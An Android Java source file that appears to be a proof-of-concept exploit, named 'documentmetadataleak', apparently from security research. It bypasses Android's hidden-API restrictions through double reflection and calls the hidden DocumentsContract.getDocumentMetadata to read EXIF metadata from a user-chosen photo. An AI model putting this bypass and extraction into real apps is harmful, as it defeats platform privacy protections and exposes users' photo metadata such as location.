package dev.virtualpatch.documentmetadataleak;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.media.ExifInterface;
import android.net.Uri;
import android.os.Bundle;
import android.provider.DocumentsContract;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class MainActivity extends AppCompatActivity {
    public static final String TAG = "EXPLOIT";
    private TextView output;
    private Button exploit;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        output = findViewById(R.id.output);
        output.setMovementMethod(new ScrollingMovementMethod());
        exploit = findViewById(R.id.exploit);
    }

    @Override
    protected void onStart() {
        super.onStart();

        /* Access to hidden APIs with double-reflection */
        try {
            Method forName = Class.class.getDeclaredMethod("forName", String.class);
            Method getDeclaredMethod = Class.class.getDeclaredMethod("getDeclaredMethod", String.class, Class[].class);

            Class vmRuntimeClass = (Class) forName.invoke(null, "dalvik.system.VMRuntime");
            Method getRuntime = (Method) getDeclaredMethod.invoke(vmRuntimeClass, "getRuntime", null);
            Method setHiddenApiExemptions = (Method) getDeclaredMethod.invoke(vmRuntimeClass, "setHiddenApiExemptions", new Class[]{String[].class});

            Object vmRuntime = getRuntime.invoke(null);
            setHiddenApiExemptions.invoke(vmRuntime, new String[][]{new String[]{"L"}});
        } catch (Exception e){
            e.printStackTrace();
        }
        /* Access to hidden APIs with double-reflection */

        exploit.setOnClickListener((v) -> {
            Log.wtf(TAG, "Getting photo");

            Intent intent = new Intent(Intent.ACTION_OPEN_DOCUMENT);
            intent.addCategory(Intent.CATEGORY_OPENABLE);
            intent.setType("image/jpeg");

            // 42 the meaning of life and everything else
            startActivityForResult(intent, 42);
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent resultData) {
        super.onActivityResult(requestCode, resultCode, resultData);
        if (requestCode == 42 && resultCode == Activity.RESULT_OK) {
            // The result data contains a URI for the document or directory that
            // the user selected.
            Uri uri = null;
            if (resultData != null) {
                Log.wtf(TAG, "Got something!");
                uri = resultData.getData();

                try {
                    Method m = DocumentsContract.class.getDeclaredMethod("getDocumentMetadata", ContentResolver.class, Uri.class);
                    m.setAccessible(true);
                    Bundle metadata = (Bundle) m.invoke(null, getApplicationContext().getContentResolver(), uri);
                    if (metadata != null) {
                        Log.wtf(TAG, "Got metadata!");
                        if (metadata.containsKey(DocumentsContract.METADATA_EXIF)) {
                            Bundle exif = metadata.getBundle(DocumentsContract.METADATA_EXIF);
                            String content = "";
                            Field[] fields = ExifInterface.class.getDeclaredFields();
                            for (Field field : fields) {
                                field.setAccessible(true);
                                if (field.getName().startsWith("TAG")) {
                                    try {
                                        String value = String.valueOf(exif.get((String) field.get(null)));
                                        if (!value.equals("null"))
                                            content += field.getName() + ": " + value + "\n";
                                    } catch (ClassCastException e) {
                                        //e.printStackTrace();
                                    }
                                }
                            }
                            output.setText(content);
                        }
                    }
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}